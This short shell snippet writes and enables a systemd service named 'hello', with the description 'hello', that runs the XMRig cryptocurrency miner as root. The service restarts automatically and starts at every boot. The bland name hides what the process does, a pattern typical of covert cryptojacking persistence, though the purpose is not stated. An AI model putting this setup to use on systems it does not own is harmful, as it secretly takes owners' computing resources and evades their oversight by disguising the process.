sudo bash -c 'cat > /lib/systemd/system/hello.service <<EOL
[Unit]
Description=hello
After=network.target
[Service]
ExecStart=/usr/local/src/xmrig/build/xmrig
WatchdogSec=1800
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOL'

sudo systemctl daemon-reload && sudo systemctl enable hello.service && sudo systemctl start hello.service
